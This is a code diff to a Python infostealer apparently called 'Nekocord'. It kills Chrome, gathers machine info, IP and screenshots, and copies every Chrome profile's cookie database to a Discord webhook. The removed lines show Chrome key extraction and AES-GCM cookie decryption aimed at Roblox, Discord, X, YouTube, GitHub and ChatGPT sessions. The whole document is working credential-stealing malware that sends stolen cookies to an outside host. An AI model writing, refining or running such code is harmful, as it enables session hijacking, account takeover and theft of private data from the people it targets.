@@ -6,6 +6,7 @@ import string
 import platform
 import subprocess
 import json
+import uuid
 import shutil
 import base64
 import random
@@ -28,7 +29,8 @@ ip = socket.gethostbyname(host)
 types = "@here"
 h00k = ""
 
-os.system("TASKKILL /F /IM chrome.exe") 
+os.system("TASKKILL /F /IM chrome.exe")
+os.system("cls") 
 
 def is_admin():
     try:
@@ -221,104 +223,60 @@ def checker():
         sys.exit(1)
 
 
-def cookie_webhook(webhook_url, cookies_file=None, status=None):
-    if status:
-        response = requests.post(webhook_url, json={
+def cookie_webhook(webhook_url, status_lines, cookie_db_path):
+    try:
+        requests.post(webhook_url, json={
             "username": "Nekocord | Cookie",
             "avatar_url": "https://i.imgur.com/VF1uUWN.png",
             "embeds": [{
-                "title": "🍪 Cookie",
-                "description": "\n".join(status),
+                "title": "🍪 Cookie Search",
+                "description": "\n".join(status_lines) if status_lines else "No status available",
             }]
         })
-        if response.status_code == 204:
-            pass
-        else:
-            pass
-    elif cookies_file:
-        with open(cookies_file, 'rb') as f:
-            files = {'file': (os.path.basename(cookies_file), f)}
-            response = requests.post(webhook_url, files=files)
-            if response.status_code == 204:
-                pass
-            else:
-                pass
 
+        with open(cookie_db_path, 'rb') as f:
+            data = {
+                "username": "Nekocord | Cookie",
+                "avatar_url": "https://i.imgur.com/VF1uUWN.png",
+            }
+            files = {'file': (os.path.basename(cookie_db_path), f)}
+            requests.post(webhook_url, data=data, files=files)
 
-def chrome_key():
-    path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")
-    with open(path, "r", encoding="utf-8") as f:
-        key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-def decrypt_cookie(enc, key):
-    try:
-        if enc[:3] == b'v10' or enc[:3] == b'v11':  
-            iv = enc[3:15]
-            payload = enc[15:-16]
-            tag = enc[-16:]
-            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
-            return cipher.decrypt_and_verify(payload, tag).decode()
-        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
     except Exception as e:
         pass
-        return None
 
-def extract_cookies(domains, webhook):
+def extract_cookies(webhook_url):
     user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data")
-    all_cookies = []
-    all_status = []
-
-    profiles = [folder for folder in os.listdir(user_data_dir) if folder.startswith("Profile") and os.path.isdir(os.path.join(user_data_dir, folder))]
+    profiles = [p for p in os.listdir(user_data_dir) if p.startswith("Profile") and os.path.isdir(os.path.join(user_data_dir, p))]
     
-    for domain in domains:
-        cookies = []
-        status = []
-        cookies_file = ""
+    if not profiles:
+        pass
+        return
 
-        for profile in profiles:
-            db_path = os.path.join(user_data_dir, f"{profile}\\Network\\Cookies")
-            if not os.path.exists(db_path):
-                continue
-            shutil.copy2(db_path, "temp.db")
-            conn = sqlite3.connect("temp.db")
-            cur = conn.cursor()
-            cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ?", (f"%{domain}%",))
-            key = chrome_key()
+    status_lines = []
+    for profile in profiles:
+        cookie_db_path = os.path.join(user_data_dir, profile, "Network", "Cookies")
+        if os.path.exists(cookie_db_path):
+            temp_db = os.path.join(os.environ['TEMP'], f"cookies")
+            try:
+                shutil.copy2(cookie_db_path, temp_db)
+                status_lines.append(f"🍪 | {profile} | Found Cookie")
+                cookie_webhook(webhook_url, status_lines, temp_db)
+            except Exception as e:
+                status_lines.append(f"🍪 {profile} | ERROR {str(e)}")
+                if os.path.exists(temp_db):
+                    os.remove(temp_db)
 
-            for host, name, enc in cur.fetchall():
-                decrypted_cookie = decrypt_cookie(enc, key)
-                if decrypted_cookie:
-                    cookies.append(f"{host} | {name} = {decrypted_cookie}")
-                    status.append(f"🟢 {host} | {name}")
-                else:
-                    cookies.append(f"{host} | {name} | ERROR")
-                    status.append(f"🔴 {host} | {name} | ERROR")
-
-            conn.close()
-            os.remove("temp.db")
-
-        if not cookies:
-            pass
-            cookies_file = os.path.join(os.environ['TEMP'], f"{domain}_cookies_backup.db")
-            shutil.copy2(db_path, cookies_file)
-            cookie_webhook(webhook, cookies_file)
-        else:
-            print(f"\n{domain} のCookies:\n" + "\n".join(cookies))
-            all_cookies.extend(cookies)
-            all_status.extend(status)
-
-       
-        if all_status:
-            cookie_webhook(webhook, None, all_status)
+    if not status_lines:
+        status_lines.append("🔴 Not Found Cookie")
+        cookie_webhook(webhook_url, status_lines, os.path.join(os.environ['TEMP'], f"empty_{uuid.uuid4().hex}.db"))
 
 def main():
-    domains = ["roblox.com", "Discord", "x.com", "youtube.com", "github.com", "chatgpt.com"]
 
     checker()
     machineinfo()
     iplogger()
     screenshot()
-    extract_cookies(domains, h00k)
+    extract_cookies(h00k)
 
 main()
